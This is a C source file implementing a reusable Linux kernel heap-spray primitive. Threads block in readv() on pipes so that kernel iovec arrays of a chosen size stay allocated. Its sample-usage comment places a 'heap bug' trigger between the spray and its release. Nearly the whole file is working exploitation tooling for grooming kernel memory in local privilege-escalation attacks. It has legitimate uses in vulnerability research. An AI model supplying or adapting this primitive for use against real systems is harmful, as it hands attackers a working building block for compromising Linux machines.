#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

typedef struct {
    int control_pipe[2];
    int data_pipe[2];
    pthread_t thread;
    struct iovec *iovecs;
    size_t iovec_count;
} pipe_iovec_heap_spray_worker_t;

typedef struct {
    pipe_iovec_heap_spray_worker_t *workers;
    size_t worker_count;
    uint8_t *release_bytes;
} pipe_iovec_heap_spray_ctx_t;

/*
 * Sample usage:
 *
 *   pipe_iovec_heap_spray_ctx_t ctx;
 *   init_pipe_iovec_heap_spray(&ctx, 128, 12, user_buffer);
 *   execute_pipe_iovec_heap_spray_arm(&ctx);
 *   execute_pipe_iovec_heap_spray_start(&ctx);
 *   // trigger heap bug while iovec arrays stay allocated
 *   execute_pipe_iovec_heap_spray_release(&ctx);
 *   cleanup_pipe_iovec_heap_spray(&ctx);
 */

static void *pipe_iovec_heap_spray_worker_main(void *opaque) {
    pipe_iovec_heap_spray_worker_t *worker = opaque;
    uint8_t gate_byte;

    if (read(worker->control_pipe[0], &gate_byte, 1) != 1) {
        return NULL;
    }

    (void)readv(worker->data_pipe[0], worker->iovecs, (int)worker->iovec_count);
    return NULL;
}

size_t pipe_iovec_heap_spray_allocation_size(size_t iovec_count) {
    return sizeof(struct iovec) * iovec_count;
}

int init_pipe_iovec_heap_spray(pipe_iovec_heap_spray_ctx_t *ctx,
                               size_t worker_count, size_t iovec_count,
                               void *iov_base) {
    size_t i;

    if (!ctx || !worker_count || !iovec_count || !iov_base) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->workers = calloc(worker_count, sizeof(*ctx->workers));
    ctx->release_bytes = calloc(iovec_count, sizeof(*ctx->release_bytes));
    if (!ctx->workers || !ctx->release_bytes) {
        return -ENOMEM;
    }
    ctx->worker_count = worker_count;

    for (i = 0; i < worker_count; i++) {
        pipe_iovec_heap_spray_worker_t *worker = &ctx->workers[i];
        size_t j;

        worker->iovecs = calloc(iovec_count, sizeof(*worker->iovecs));
        if (!worker->iovecs) {
            return -ENOMEM;
        }
        worker->iovec_count = iovec_count;

        if (pipe(worker->control_pipe) < 0 || pipe(worker->data_pipe) < 0) {
            return -errno;
        }

        for (j = 0; j < iovec_count; j++) {
            worker->iovecs[j].iov_base = (uint8_t *)iov_base + j;
            worker->iovecs[j].iov_len = 1;
        }
    }

    return 0;
}

int execute_pipe_iovec_heap_spray_arm(pipe_iovec_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (pthread_create(&ctx->workers[i].thread, NULL,
                           pipe_iovec_heap_spray_worker_main,
                           &ctx->workers[i]) != 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_pipe_iovec_heap_spray_start(pipe_iovec_heap_spray_ctx_t *ctx) {
    uint8_t gate_byte = 'S';
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (write(ctx->workers[i].control_pipe[1], &gate_byte, 1) != 1) {
            return -EIO;
        }
    }

    return 0;
}

int execute_pipe_iovec_heap_spray_release(pipe_iovec_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        pipe_iovec_heap_spray_worker_t *worker = &ctx->workers[i];
        if (write(worker->data_pipe[1], ctx->release_bytes, worker->iovec_count) !=
            (ssize_t)worker->iovec_count) {
            return -EIO;
        }
    }

    for (i = 0; i < ctx->worker_count; i++) {
        pthread_join(ctx->workers[i].thread, NULL);
    }

    return 0;
}

void cleanup_pipe_iovec_heap_spray(pipe_iovec_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    if (ctx->workers) {
        for (i = 0; i < ctx->worker_count; i++) {
            pipe_iovec_heap_spray_worker_t *worker = &ctx->workers[i];
            if (worker->control_pipe[0] > 0) {
                close(worker->control_pipe[0]);
            }
            if (worker->control_pipe[1] > 0) {
                close(worker->control_pipe[1]);
            }
            if (worker->data_pipe[0] > 0) {
                close(worker->data_pipe[0]);
            }
            if (worker->data_pipe[1] > 0) {
                close(worker->data_pipe[1]);
            }
            free(worker->iovecs);
        }
    }

    free(ctx->workers);
    free(ctx->release_bytes);
    memset(ctx, 0, sizeof(*ctx));
}
